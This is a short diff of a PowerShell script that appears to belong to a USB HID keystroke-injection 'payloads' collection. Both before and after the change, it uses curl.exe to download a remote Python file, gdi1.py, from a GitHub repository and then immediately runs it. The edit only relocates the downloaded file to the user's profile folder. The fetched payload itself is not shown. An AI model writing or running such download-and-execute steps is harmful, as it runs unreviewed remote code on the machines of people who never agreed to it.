@@ -19,5 +19,5 @@ else {
     $t2 = & python -c "from GDI_effects.GDI import *" 2>&1
 }
 
-curl.exe https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/gdi1.py --output gdi1.py
-python gdi1.py
+curl.exe https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/gdi1.py --output (Join-Path $env:USERPROFILE 'gdi1.py')
+python (Join-Path $env:USERPROFILE 'gdi1.py')
